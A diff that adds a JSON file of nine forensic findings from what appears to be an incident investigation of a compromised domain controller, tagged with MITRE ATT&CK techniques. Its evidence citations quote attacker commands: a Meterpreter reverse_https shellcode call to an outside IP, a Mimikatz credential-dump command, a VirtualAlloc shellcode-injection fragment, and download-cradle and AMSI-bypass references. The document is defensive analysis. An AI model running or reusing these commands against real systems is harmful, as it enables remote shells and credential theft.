@@ -1,0 +1,15 @@
+{
+  "case_id": "SRL2018-DC",
+  "total_findings": 9,
+  "findings": [
+    {"finding_id": "F-001", "title": "External C2: Meterpreter reverse_https to 52.41.122.38:443", "confidence": "HIGH", "evidence_tier": 1, "severity": "CRITICAL", "mitre": ["T1071.001", "T1573"], "citation": "[TOOL: strings, pattern: Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 52.41.122.38 -Lport 443]"},
+    {"finding_id": "F-002", "title": "Mimikatz sekurlsa::logonpasswords — full domain credential dump", "confidence": "HIGH", "evidence_tier": 1, "severity": "CRITICAL", "mitre": ["T1003.001", "T1003.006"], "citation": "[TOOL: strings, pattern: invoke-mimikatz -command privilege::debug sekurlsa::logonpasswords]"},
+    {"finding_id": "F-003", "title": "VirtualAlloc shellcode injection (PS + Python + VBS variants)", "confidence": "HIGH", "evidence_tier": 1, "severity": "CRITICAL", "mitre": ["T1055.001", "T1059.006"], "citation": "[TOOL: strings, pattern: VirtualAlloc(0,$l,0x3000,0x40) + CreateThread]"},
+    {"finding_id": "F-004", "title": "WMI lateral movement — 5 WmiPrvSE, 30+ cmd.exe, wmic process call create", "confidence": "HIGH", "evidence_tier": 1, "severity": "HIGH", "mitre": ["T1047", "T1021.006"], "citation": "[TOOL: volatility3.psscan + strings, PIDs: 2344,5816,6312,8172,8872]"},
+    {"finding_id": "F-005", "title": "PowerSploit framework — Invoke-Shellcode, ReflectivePEInjection, Kerberoast, Keystrokes", "confidence": "HIGH", "evidence_tier": 1, "severity": "HIGH", "mitre": ["T1558.003", "T1056.001"], "citation": "[TOOL: strings, patterns: Invoke-Kerberoast, Get-Keystrokes, Invoke-ReflectivePEInjection]"},
+    {"finding_id": "F-006", "title": "AMSI bypass — 9 references, evading Windows Defender", "confidence": "HIGH", "evidence_tier": 1, "severity": "HIGH", "mitre": ["T1562.001"], "citation": "[TOOL: strings, pattern: AMSI bypass]"},
+    {"finding_id": "F-007", "title": "Download cradles — IEX+WebClient, VBS ActiveX, Office macro", "confidence": "HIGH", "evidence_tier": 1, "severity": "HIGH", "mitre": ["T1059.001", "T1059.005", "T1204.002"], "citation": "[TOOL: strings, patterns: IEX+DownloadString, WScript.Shell, Workbook_Open]"},
+    {"finding_id": "F-008", "title": "Domain recon — PowerView, Invoke-UserHunter, PsExec, schtasks", "confidence": "MEDIUM", "evidence_tier": 1, "severity": "MEDIUM", "mitre": ["T1087", "T1018"], "citation": "[TOOL: strings, patterns: Invoke-UserHunter, Invoke-Command, PsExec]"},
+    {"finding_id": "F-009", "title": "VBS dropper at C:\\Users\\Public\\config.vbs (hidden)", "confidence": "HIGH", "evidence_tier": 1, "severity": "HIGH", "mitre": ["T1059.005", "T1564.001"], "citation": "[TOOL: strings, pattern: SetAttr C:\\Users\\Public\\config.vbs vbHidden]"}
+  ]
+}
